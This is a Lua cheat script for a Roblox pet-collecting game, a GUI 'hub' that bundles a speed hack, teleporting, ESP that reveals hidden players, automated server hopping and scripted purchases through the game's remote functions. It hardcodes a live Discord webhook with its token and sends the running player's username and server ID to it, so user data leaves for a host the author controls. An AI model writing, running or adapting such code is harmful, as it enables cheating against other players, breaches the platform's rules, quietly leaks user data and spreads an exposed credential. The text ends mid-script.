--trixx

repeat wait() until game:IsLoaded()
repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer:FindFirstChild("PlayerGui")

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local lp = Players.LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:WaitForChild("Humanoid")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local skyY = 230        
local dropDistance = 50 
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local espInvisEnabled = false
local espAllEnabled = false

local speedMultiplier = 2.5
local toggled = false

local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local isRunning = false

local petsToFind = {
	    ["Tralalero Tralala"] = true,
	    ["La Vacca Saturno Saturnita"] = true,
	    ["Chimpanzini Spiderini"] = true,
	    ["Los Tralaleritos"] = true,
	    ["Graipuss Medussi"] = true,
	    ["La Grande Combinasion"] = true,
	    ["Garama and Madundung"] = true,
       	    ["Orcalero Orcala"] = true,
    	    ["Torrtuginni Dragonfrutini"] = true,
    	    ["Pot Hotspot"] = true,
    	    ["Las Tralaleritas"] = true,
    	    ["Lucky Block"] = true
}

local HttpService = game:GetService("HttpService")

local sendedHOOK = false
local webhookUrl = "https://discord.com/api/webhooks/1391128950528544939/VWErk11Lc0cscGb6RMRFkbu_XpK3WQ_cuFU7GgRipHGHDLqgqiLmhBLigrO7oOB-RZnK" 

local playedSoundOnce = false
local petBeams = {}

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://115047431910518"
sound.Volume = 1
sound.Name = "FoundPetSound"
sound.Parent = game:GetService("SoundService") 


local HttpService = game:GetService("HttpService")
local autoBuyConfigFile = "AutoBuyConfig.json"

local autoBuyItems = {
	["Medusa's Head"] = false,
	["Invisibility Cloak"] = false,
	["Quantum Cloner"] = false,
	["Grapple Hook"] = false,
    ["Trap"] = false,
    ["All Seeing Sentry"] = false
}

if isfile and isfile(autoBuyConfigFile) then
	local success, data = pcall(function()
		return HttpService:JSONDecode(readfile(autoBuyConfigFile))
	end)
	if success and typeof(data) == "table" then
		for name, value in pairs(data) do
			if autoBuyItems[name] ~= nil then
				autoBuyItems[name] = value
			end
		end
	end
end


local function sendWebhook(foundPets)
	if webhookUrl == "" or #foundPets == 0 then return end
	local data = {
	["content"] = "**üîî Pets Found:**\n" ..
		table.concat(foundPets, "\n") ..
		"\n\nüë§ Player: `" .. Players.LocalPlayer.Name .. "`" ..
		"\nüåê Server ID: `" .. game.JobId .. "`",
	["username"] = "Pet Scanner"
    }
	local json = HttpService:JSONEncode(data)
	sendH00K = true
	local request = (syn and syn.request) or (http and http.request) or http_request or request
	if request then
		pcall(function()
			request({
				Url = webhookUrl,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = json
			})
		end)
	end
end

local function loadHopStatus()
	local success, result = pcall(function()
		return HttpService:JSONDecode(readfile("ServerHopActive.json"))
	end)
	if success and typeof(result) == "boolean" then
		return result
	else
		writefile("ServerHopActive.json", HttpService:JSONEncode(false))
		return false
	end
end

local function saveHopStatus(value)
	writefile("ServerHopActive.json", HttpService:JSONEncode(value))
end

local isRunning = loadHopStatus()

RunService.RenderStepped:Connect(function(dt)
	if not toggled then return end
	if humanoid.MoveDirection.Magnitude > 0 then	
		local moveDir = humanoid.MoveDirection.Unit
		local delta = moveDir * humanoid.WalkSpeed * (speedMultiplier - 1) * dt
		hrp.CFrame = hrp.CFrame + delta
	end
end)

UIS.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode == Enum.KeyCode.V then
		toggled = not toggled
		print("‚öôÔ∏è SpeedHack " .. (toggled and "on" or "off"))
	end
end)

local function loadPetSettings()
	local success, result = pcall(function()
		return HttpService:JSONDecode(readfile("PetFinderSettings.json"))
	end)
	if success and typeof(result) == "table" then
		for name, state in pairs(result) do
			if petsToFind[name] ~= nil then
				petsToFind[name] = state
			end
		end
	end
end

local function savePetSettings()
	writefile("PetFinderSettings.json", HttpService:JSONEncode(petsToFind))
end

loadPetSettings()

local success, result = pcall(function()
	return HttpService:JSONDecode(readfile("NotSameServers.json"))
end)

if success and typeof(result) == "table" then
	AllIDs = result
else
	AllIDs = { actualHour }
	writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
end


--gui start
local ScreenGui = Instance.new("ScreenGui", PlayerGui)
ScreenGui.Name = "viperhub"
ScreenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", ScreenGui)
mainFrame.Size = UDim2.new(0, 500, 0, 350)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local stroke = Instance.new("UIStroke")
stroke.Thickness = 3
stroke.Transparency = 0 
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Parent = mainFrame

local RunService = game:GetService("RunService")

RunService.RenderStepped:Connect(function()
	local hue = tick() % 5 / 5 
	local rgb = Color3.fromHSV(hue, 1, 1)
	stroke.Color = rgb
end)


local navbar = Instance.new("Frame", mainFrame)
navbar.Size = UDim2.new(1, 0, 0, 40)
navbar.Position = UDim2.new(0, 0, 0, 0)
navbar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
navbar.BorderSizePixel = 0
navbar.ZIndex = 2
Instance.new("UICorner", navbar).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", navbar)
title.Size = UDim2.new(0, 200, 1, 0)
title.Position = UDim2.new(0, 12, 0, 0)
title.Text = "viperhub v2.15"
title.TextColor3 = Color3.fromRGB(250, 250, 250)
title.Font = Enum.Font.FredokaOne
title.TextSize = 22
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 3


local closeBtn = Instance.new("TextButton", navbar)
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -30, 0, 8)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
closeBtn.BorderSizePixel = 0
closeBtn.ZIndex = 3
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)


local minimizeBtn = Instance.new("TextButton", navbar)
minimizeBtn.Size = UDim2.new(0, 24, 0, 24)
minimizeBtn.Position = UDim2.new(1, -60, 0, 8)
minimizeBtn.Text = "‚îÅ"
minimizeBtn.TextColor3 = Color3.fromRGB(200, 200, 255)
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.TextSize = 16
minimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
minimizeBtn.BorderSizePixel = 0
minimizeBtn.ZIndex = 3
Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(0, 6)


local TabButtonsFrame = Instance.new("Frame", mainFrame)
TabButtonsFrame.Size = UDim2.new(0, 120, 1, -50)
TabButtonsFrame.Position = UDim2.new(0, 0, 0, 50)
TabButtonsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
TabButtonsFrame.BorderSizePixel = 0
Instance.new("UICorner", TabButtonsFrame).CornerRadius = UDim.new(0, 12)


local tabs = {"Main","Utilities", "Buy", "Pet Settings","AutoBuy", "Settings"}
local pages = {}

for i, tabName in ipairs(tabs) do
	local tabButton = Instance.new("TextButton", TabButtonsFrame)
	tabButton.Size = UDim2.new(1, -10, 0, 40)
	tabButton.Position = UDim2.new(0, 5, 0, (i - 1) * 45 + 10)
	tabButton.Text = tabName
	tabButton.Font = Enum.Font.GothamBold
	tabButton.TextColor3 = Color3.fromRGB(200, 200, 255)
	tabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
	tabButton.BorderSizePixel = 0
	tabButton.TextSize = 16
	Instance.new("UICorner", tabButton).CornerRadius = UDim.new(0, 8)

	local page = Instance.new("Frame", mainFrame)
	page.Size = UDim2.new(1, -130, 1, -60)
	page.Position = UDim2.new(0, 130, 0, 50)
	page.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
	page.BorderSizePixel = 0
	page.Visible = (i == 1)
	Instance.new("UICorner", page).CornerRadius = UDim.new(0, 10)

	pages[tabName] = page

	tabButton.MouseButton1Click:Connect(function()
		for _, pg in pairs(pages) do
			pg.Visible = false
		end
		page.Visible = true
	end)
end


local isMinimized = false
local originalSize = mainFrame.Size

minimizeBtn.MouseButton1Click:Connect(function()
	if isMinimized then
		local tween = TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = originalSize})
		tween:Play()
		wait(0.3)
		TabButtonsFrame.Visible = true
		for _, page in pairs(pages) do
			page.Visible = false
		end
		pages["Main"].Visible = true
	else
		TabButtonsFrame.Visible = false
		for _, page in pairs(pages) do
			page.Visible = false
		end
		local tween = TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 500, 0, 50)})
		tween:Play()
	end
	isMinimized = not isMinimized
end)

closeBtn.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)


local purchasePanel = Instance.new("Frame", pages["Buy"])
purchasePanel.Size = UDim2.new(1, -20, 1, -20)
purchasePanel.Position = UDim2.new(0, 10, 0, 10)
purchasePanel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
purchasePanel.BorderSizePixel = 0
purchasePanel.ZIndex = 1
Instance.new("UICorner", purchasePanel).CornerRadius = UDim.new(0, 10)

local scroll = Instance.new("ScrollingFrame", purchasePanel)
scroll.Size = UDim2.new(1, 0, 1, 0)
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.ScrollBarThickness = 8
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ZIndex = 2

local uiList = Instance.new("UIListLayout", scroll)
uiList.Padding = UDim.new(0, 6)
uiList.SortOrder = Enum.SortOrder.LayoutOrder

local purchases = {
	{ Name = "Medusa's Head", Icon = "ü§¢" },
	{ Name = "Invisibility Cloak", Icon = "üß•" },
	{ Name = "Quantum Cloner", Icon = "üß™" },
	{ Name = "Grapple Hook", Icon = "üñ§" },
	{ Name = "Boogie Bomb", Icon = "ü§©" },
	{ Name = "Trap", Icon = "üòã" },
	{ Name = "Coil Combo", Icon = "üåÄ" },
	{ Name = "Bee Launcher", Icon = "üêù" },
	{ Name = "Web Slinger", Icon = "üòé" },
	{ Name = "All Seeing Sentry", Icon = "üëÅÔ∏è" }
}

for _, item in ipairs(purchases) do
	local btn = Instance.new("TextButton", scroll)
	btn.Size = UDim2.new(1, -20, 0, 40)
	btn.Text = item.Icon .. "  " .. item.Name
	btn.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
	btn.TextColor3 = Color3.fromRGB(220, 220, 255)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 16
	btn.BorderSizePixel = 0
	btn.ZIndex = 2
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	btn.MouseEnter:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(110, 70, 190)
	end)
	btn.MouseLeave:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
	end)

	btn.MouseButton1Click:Connect(function()
		print("üõí –ü–æ–∫—É–ø–∫–∞: " .. item.Name)
		pcall(function()
			game:GetService("ReplicatedStorage")
				:WaitForChild("Packages")
				:WaitForChild("Net")
				:WaitForChild("RF/CoinsShopService/RequestBuy")
				:InvokeServer(item.Name)
		end)
	end)
end

task.defer(function()
	scroll.CanvasSize = UDim2.new(0, 0, 0, uiList.AbsoluteContentSize.Y + 10)
	uiList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		scroll.CanvasSize = UDim2.new(0, 0, 0, uiList.AbsoluteContentSize.Y + 10)
	end)
end)



pcall(function()
	local loaded = readfile("NotSameServers.json")
	AllIDs = HttpService:JSONDecode(loaded)
end)

local statusLabel = Instance.new("TextLabel", pages["Main"])
statusLabel.Size = UDim2.new(1, -20, 0, 40)
statusLabel.Position = UDim2.new(0, 10, 0, 10)
statusLabel.Text = "‚è≥ Waiting to Start..."
statusLabel.TextColor3 = Color3.fromRGB(130, 200, 255)
statusLabel.Font = Enum.Font.GothamSemibold
statusLabel.TextSize = 16
statusLabel.BackgroundTransparency = 1
statusLabel.TextWrapped = true

local petResultLabel = Instance.new("TextLabel", pages["Main"])
petResultLabel.Size = UDim2.new(1, -20, 0, 100)
petResultLabel.Position = UDim2.new(0, 10, 0, 50)
petResultLabel.BackgroundTransparency = 1
petResultLabel.TextXAlignment = Enum.TextXAlignment.Left
petResultLabel.TextWrapped = true
petResultLabel.TextYAlignment = Enum.TextYAlignment.Top
petResultLabel.Text = "üêæ Found pets: none"
petResultLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
petResultLabel.Font = Enum.Font.Gotham
petResultLabel.TextSize = 15

local idLabel = Instance.new("TextLabel", pages["Settings"])
idLabel.Size = UDim2.new(1, -20, 0.6, 0)
idLabel.Position = UDim2.new(0, 10, 0, -70)
idLabel.BackgroundTransparency = 1
idLabel.TextColor3 = Color3.new(1, 1, 1)
idLabel.Font = Enum.Font.Gotham
idLabel.TextSize = 14
idLabel.TextWrapped = true
idLabel.Text = "Server ID: \n" .. game.JobId

local copyBtn = Instance.new("TextButton", pages["Settings"])
copyBtn.Size = UDim2.new(0.85, 0, 0.1, 0)
copyBtn.Position = UDim2.new(0, 25, 0, 45)
copyBtn.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
copyBtn.TextColor3 = Color3.new(1, 1, 1)
copyBtn.Font = Enum.Font.GothamBold
copyBtn.TextSize = 14
copyBtn.Text = "Copy"
Instance.new("UICorner", copyBtn)

copyBtn.MouseButton1Click:Connect(function()
	setclipboard(game.JobId)
	copyBtn.Text = "Copied!"
	task.wait(1.5)
	copyBtn.Text = "Copy"
end)




local function pulseRGB(obj)
	spawn(function()
		while obj and obj.Parent do
			obj.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
			wait(0.2)
		end
	end)
end


local startButton = Instance.new("TextButton", pages["Main"])
startButton.Size = UDim2.new(0, 200, 0, 36)
startButton.Position = UDim2.new(0, 10, 0, 250)
startButton.Text = "‚ñ∂Ô∏è Start Hop"
startButton.TextColor3 = Color3.new(1, 1, 1)
startButton.Font = Enum.Font.GothamBold
startButton.TextSize = 18
startButton.BackgroundColor3 = Color3.fromRGB(55, 60, 109)
startButton.BorderSizePixel = 0
Instance.new("UICorner", startButton).CornerRadius = UDim.new(0, 8)

local stopButton = Instance.new("TextButton", pages["Main"])
stopButton.Size = UDim2.new(0, 150, 0, 36)
stopButton.Position = UDim2.new(0, 210, 0, 250)
stopButton.Text = "‚èπ Stop"
stopButton.TextColor3 = Color3.new(1, 1, 1)
stopButton.Font = Enum.Font.GothamBold
stopButton.TextSize = 18
stopButton.BackgroundColor3 = Color3.fromRGB(66, 60, 109)
Instance.new("UICorner", stopButton).CornerRadius = UDim.new(0, 8)

stopButton.MouseButton1Click:Connect(function()
	isRunning = false
	saveHopStatus(false)
	statusLabel.Text = "‚èπ ServerHop Stopped"
end)

local autoHopButton = Instance.new("TextButton", pages["Main"])
autoHopButton.Size = UDim2.new(1, -20, 0, 36)
autoHopButton.Position = UDim2.new(0, 10, 1, -80)
autoHopButton.Text = "üîÑ AutoHop"
autoHopButton.TextColor3 = Color3.new(1, 1, 1)
autoHopButton.Font = Enum.Font.GothamBold
autoHopButton.TextSize = 18
autoHopButton.BackgroundColor3 = Color3.fromRGB(55, 60, 90)
Instance.new("UICorner", autoHopButton).CornerRadius = UDim.new(0, 8)


local function clearBeams()
	for _, beam in ipairs(petBeams) do
		if beam and beam.Parent then
			beam:Destroy()
		end
	end
	table.clear(petBeams)
end

local function getOrCreatePlayerAttachment()
	local att = hrp:FindFirstChild("PlayerBeamAttachment")
	if not att then
		att = Instance.new("Attachment")
		att.Name = "PlayerBeamAttachment"
		att.Parent = hrp
	end
	return att
end

local alreadyBought = false

local function autoBuyEnabledItems()
	if alreadyBought then return end
	alreadyBought = true

	task.spawn(function()
		for itemName, enabled in pairs(autoBuyItems) do
			if enabled then
				pcall(function()
					game:GetService("ReplicatedStorage")
						:WaitForChild("Packages")
						:WaitForChild("Net")
						:WaitForChild("RF/CoinsShopService/RequestBuy")
						:InvokeServer(itemName)
				end)
				warn("üõç –ê–≤—Ç–æ–ø–æ–∫—É–ø–∫–∞: " .. itemName)
				task.wait(1.5) 
			end
		end
	end)
end

local function getMutationMap()
	local mutationMap = {}

	local plots = Workspace:FindFirstChild("Plots")
	if not plots then return mutationMap end

	for _, plot in ipairs(plots:GetChildren()) do
		local podiums = plot:FindFirstChild("AnimalPodiums")
		if podiums then
			for _, podium in ipairs(podiums:GetChildren()) do
				local base = podium:FindFirstChild("Base")
				local spawn = base and base:FindFirstChild("Spawn")
				local attachment = spawn and spawn:FindFirstChild("Attachment")
				local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
				local displayName = overhead and overhead:FindFirstChild("DisplayName")
				local mutation = overhead and overhead:FindFirstChild("Mutation")

				if spawn and displayName and displayName:IsA("TextLabel") then
					local name = displayName.Text
					local mutationText = (mutation and mutation:IsA("TextLabel") and mutation.Visible and mutation.Text ~= "" and mutation.Text ~= "None") and mutation.Text or nil
					table.insert(mutationMap, {
						name = name,
						position = spawn.Position,
						mutation = mutationText
					})
				end
			end
		end
	end

	return mutationMap
end


local function scanForPets()
	clearBeams()
	local foundCount = {}
	local alreadyTagged = {}
	local mutationData = getMutationMap()

	local playerAtt = getOrCreatePlayerAttachment()

	for _, obj in pairs(Workspace:GetDescendants()) do
		if petsToFind[obj.Name] and obj:IsA("Model") then
			local root = obj:FindFirstChild("HumanoidRootPart") or obj.PrimaryPart
			if root and obj:IsDescendantOf(Workspace) and not alreadyTagged[obj] then
				if (root.Position - hrp.Position).Magnitude < 5000 then


					local mutationType = nil
					for _, data in ipairs(mutationData) do
						if string.lower(data.name) == string.lower(obj.Name) and (data.position - root.Position).Magnitude < 5 then
							mutationType = data.mutation
							break
						end
					end

					if not obj:FindFirstChild("PetTag") then
						local tag = Instance.new("BillboardGui")
						tag.Name = "PetTag"
						tag.Size = UDim2.new(0, 140, 0, 80)
						tag.AlwaysOnTop = true
						tag.StudsOffset = Vector3.new(0, 3, 0)
						tag.Parent = obj

						local label = Instance.new("TextLabel")
						label.Size = UDim2.new(1, 0, 1, 0)
						label.BackgroundTransparency = 1
						label.TextColor3 = Color3.new(1, 1, 1)
						label.TextStrokeTransparency = 0.5
						label.TextScaled = true
						label.Font = Enum.Font.GothamBold
						label.Text = obj.Name .. (mutationType and (" üß¨" .. mutationType) or "")
						label.Parent = tag

						pulseRGB(label)
					end

					local petAtt = Instance.new("Attachment")
					petAtt.Name = "PetBeamAttachment"
					petAtt.Parent = root

					local beam = Instance.new("Beam")
					beam.Name = "PetBeam"
					beam.Attachment0 = playerAtt
					beam.Attachment1 = petAtt
					beam.Width0 = 0.15
					beam.Width1 = 0.15
					beam.LightEmission = 1
					beam.Transparency = NumberSequence.new(0.1)
					beam.FaceCamera = true
					beam.Parent = root

					task.spawn(function()
						while beam and beam.Parent do
							local hue = tick() % 5 / 5
							local color = Color3.fromHSV(hue, 1, 1)
							beam.Color = ColorSequence.new(color)
							task.wait(0.1)
						end
					end)

					table.insert(petBeams, beam)
					foundCount[obj.Name .. (mutationType and " üß¨" .. mutationType or " ")] = (foundCount[obj.Name] or 0) + 1
					alreadyTagged[obj] = true
				end
			end
		end
	end

	if next(foundCount) then
		local displayLines = {}
		for name, count in pairs(foundCount) do
			table.insert(displayLines, name .. " (x" .. count .. ")")
		end
		petResultLabel.Text = "‚úÖ Found pets:\n" .. table.concat(displayLines, "\n")

		if not playedSoundOnce then
			playedSoundOnce = true
			sound:Play()
		end

		if not sendedHOOK then
			sendWebhook(displayLines)
			sendedHOOK = true
		end

		autoBuyEnabledItems()
	else
		petResultLabel.Text = "‚ùå Found pets: none"
	end
end


spawn(function()
	while true do
		scanForPets()
		wait(0.1)
	end
end)

local function hasWantedPets()
	for name, enabled in pairs(petsToFind) do
		if enabled then
			for _, obj in pairs(Workspace:GetDescendants()) do
				if obj:IsA("Model") and obj.Name == name then
					return true
				end
			end
		end
	end
	return false
end


local function teleportToNextServer()
	if not isRunning then
		statusLabel.Text = "‚èπ AutoHop Stopped"
		return
	end

	statusLabel.Text = "üîÅ Searching servers..."
	local baseURL = "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"
	local cursor = ""
	local attemptedServers = {}

	while isRunning do
		local url = baseURL .. (cursor ~= "" and "&cursor=" .. HttpService:UrlEncode(cursor) or "")
		local success, response = pcall(function()
			return HttpService:JSONDecode(game:HttpGet(url))
		end)

		if success and response and response.data then
			cursor = response.nextPageCursor or ""

			for _, server in ipairs(response.data) do
				if not isRunning then return end

				local id = tostring(server.id)
				local alreadyTried = table.find(AllIDs, id) or attemptedServers[id]

				if server.playing < server.maxPlayers and not alreadyTried then
					table.insert(AllIDs, id)
					attemptedServers[id] = true

					statusLabel.Text = "üåê Teleporting to:\n" .. id
					pcall(function()
						writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
						TeleportService:TeleportToPlaceInstance(PlaceID, id, Players.LocalPlayer)
					end)

					wait(0.3) 
				end
			end

			if not cursor then
			
				statusLabel.Text = "‚ôªÔ∏è All servers tried. Resetting history..."
				pcall(function() delfile("NotSameServers.json") end)
				AllIDs = { actualHour }
				writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
				cursor = ""
				wait(0.5)
			end
		else
			statusLabel.Text = "‚ö†Ô∏è Failed to fetch servers. Retrying..."
			wait(3)
		end
	end
end

autoHopButton.MouseButton1Click:Connect(function()
	isRunning = true
	saveHopStatus(true)
	statusLabel.Text = "üîÑ AutoHop started"
	teleportToNextServer()
end)


startButton.MouseButton1Click:Connect(function()
	if isRunning then return end

	isRunning = true
	statusLabel.Text = "üîÅ Starting AutoHop..."

	spawn(function()
		while isRunning do
			if hasWantedPets() then
				statusLabel.Text = "‚úÖ Pets Found! Stopping AutoHop"
				isRunning = false
				break
			end
			statusLabel.Text = "üîÅ Getting servers..."
			teleportToNextServer()
			wait(5)
		end
	end)
end)


local petPanel = Instance.new("ScrollingFrame")
petPanel.Size = UDim2.new(0, 350, 1, -20)
petPanel.Position = UDim2.new(0, 10, 0, 10)
petPanel.CanvasSize = UDim2.new(0, 0, 0, 0)
petPanel.ScrollBarThickness = 4
petPanel.ScrollBarImageColor3 = Color3.fromRGB(130, 80, 200) 
petPanel.BackgroundColor3 = Color3.fromRGB(30, 30, 45) 
petPanel.BorderSizePixel = 0
petPanel.ClipsDescendants = true
petPanel.ZIndex = 1
petPanel.Parent = pages["Pet Settings"]

Instance.new("UICorner", petPanel).CornerRadius = UDim.new(0, 10)

local layout = Instance.new("UIListLayout", petPanel)
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	petPanel.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)

for name, state in pairs(petsToFind) do
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -14, 0, 30) 
	btn.Text = (state and "‚úÖ " or "‚ùå ") .. name
	btn.TextColor3 = state and Color3.fromRGB(200, 255, 200) or Color3.fromRGB(255, 100, 120)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 14
	btn.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
	btn.BorderSizePixel = 0
	btn.Parent = petPanel

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

	btn.MouseButton1Click:Connect(function()
		petsToFind[name] = not petsToFind[name]
		btn.Text = (petsToFind[name] and "‚úÖ " or "‚ùå ") .. name
		btn.TextColor3 = petsToFind[name] and Color3.fromRGB(200, 255, 200) or Color3.fromRGB(255, 100, 120)
		savePetSettings()
	end)
end

--esp
local function teleportToSky()
  hrp.CFrame = CFrame.new(hrp.Position.X, skyY, hrp.Position.Z)
  print("skyrise")
end

local function stepOffSkyPlatform()
  local currentY = hrp.Position.Y
  hrp.CFrame = CFrame.new(hrp.Position.X, currentY - dropDistance, hrp.Position.Z)
  print("‚è¨skyfall")
end

UIS.InputBegan:Connect(function(input, gpe)
  if gpe then return end
  if input.KeyCode == Enum.KeyCode.X then
    teleportToSky()
  elseif input.KeyCode == Enum.KeyCode.Z then
    stepOffSkyPlatform()
  end
end)

local function createESP(char, tag)
  if not char:FindFirstChild(tag) then
    local highlight = Instance.new("Highlight")
    highlight.Name = tag
    highlight.FillColor = Color3.fromRGB(255, 0, 0)
    highlight.FillTransparency = 0.5
    highlight.OutlineColor = Color3.new(1, 1, 1)
    highlight.OutlineTransparency = 0
    highlight.Adornee = char
    highlight.Parent = char
  end
end

local function removeESP(char, tag)
  local esp = char:FindFirstChild(tag)
  if esp then esp:Destroy() end
end

local function createMarker(root)
  if not root:FindFirstChild("AntiInvisMarker") then
    local marker = Instance.new("BillboardGui")
    marker.Name = "AntiInvisMarker"
    marker.Adornee = root
    marker.Size = UDim2.new(0, 100, 0, 40)
    marker.AlwaysOnTop = true
    marker.StudsOffset = Vector3.new(0, 3, 0)
    marker.Parent = root

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "üëª Hidden Player"
    label.TextColor3 = Color3.new(1, 0, 0)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = marker
  end
end

local function removeMarker(root)
  local m = root:FindFirstChild("AntiInvisMarker")
  if m then m:Destroy() end
end

local function isInvisible(char)
  for _, part in pairs(char:GetDescendants()) do
    if part:IsA("BasePart") and part.Transparency < 0.98 and part.Name ~= "HumanoidRootPart" then
      return false
    end
  end
  return true
end

local function updateESP()
  for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
      local char = player.Character
      if char and char:IsDescendantOf(workspace) then
        local root = char:FindFirstChild("HumanoidRootPart")
        local invis = isInvisible(char)

        if espAllEnabled then
          createESP(char, "ESP_All")
        else
          removeESP(char, "ESP_All")
        end

        if espInvisEnabled and invis then
          createESP(char, "ESP_Invis")
          if root then createMarker(root) end
        else
          removeESP(char, "ESP_Invis")
          if root then removeMarker(root) end
        end
      end
    end
  end
end

UserInputService.InputBegan:Connect(function(input, gpe)
  if gpe then return end
  if input.KeyCode == Enum.KeyCode.Q then
    espInvisEnabled = not espInvisEnabled
    print("üëª ESP Invisibles: " .. (espInvisEnabled and "ON" or "OFF"))
  elseif input.KeyCode == Enum.KeyCode.E then
    espAllEnabled = not espAllEnabled
    print("üßç ESP All Players: " .. (espAllEnabled and "ON" or "OFF"))
  end
end)

RunService.Stepped:Connect(function()
  if espInvisEnabled or espAllEnabled then
    updateESP()
  end
end)

if loadHopStatus() then
	spawn(function()
		wait(2) 
		if hasWantedPets() then
			statusLabel.Text = "‚úÖ Pets Found! AutoHop stopped"
			isRunning = false
			saveHopStatus(false)
		else
			statusLabel.Text = "üîÅ AutoHop: hopping..."
			teleportToNextServer()
		end
	end)
end

local utilToggleFrame = Instance.new("Frame", pages["AutoBuy"])
utilToggleFrame.Size = UDim2.new(1, -20, 1, -20)
utilToggleFrame.Position = UDim2.new(0, 10, 0, 10)
utilToggleFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
utilToggleFrame.BorderSizePixel = 0
Instance.new("UICorner", utilToggleFrame).CornerRadius = UDim.new(0, 10)

local UIListLayout = Instance.new("UIListLayout", utilToggleFrame)
UIListLayout.Padding = UDim.new(0, 6)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

for itemName, enabled in pairs(autoBuyItems) do
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 36)
	btn.Text = (enabled and "‚úÖ " or "‚ùå ") .. itemName
	btn.TextColor3 = enabled and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 100, 100)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 15
	btn.BackgroundColor3 = Color3.fromRGB(120, 80, 200)
	btn.BorderSizePixel = 0
	btn.Parent = utilToggleFrame
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

	btn.MouseButton1Click:Connect(function()
		autoBuyItems[itemName] = not autoBuyItems[itemName]
		btn.Text = (autoBuyItems[itemName] and "‚úÖ " or "‚ùå ") .. itemName
		btn.TextColor3 = autoBuyItems[itemName] and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 100, 100)


		if writefile then
			pcall(function()
				writefile(autoBuyConfigFile, HttpService:JSONEncode(autoBuyItems))
			end)
		end
	end)
end

local HttpService = game:GetService("HttpService")
local utilitiesTab = pages and pages["Utilities"]

local container = Instance.new("Frame", utilitiesTab)
container.Size = UDim2.new(1, -20, 0, 200)
container.Position = UDim2.new(0, 10, 0, 10)
container.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
container.BorderSizePixel = 2
container.BorderColor3 = Color3.fromRGB(100, 0, 200)
Instance.new("UICorner", container).CornerRadius = UDim.new(0, 12)

local scroll = Instance.new("ScrollingFrame", container)
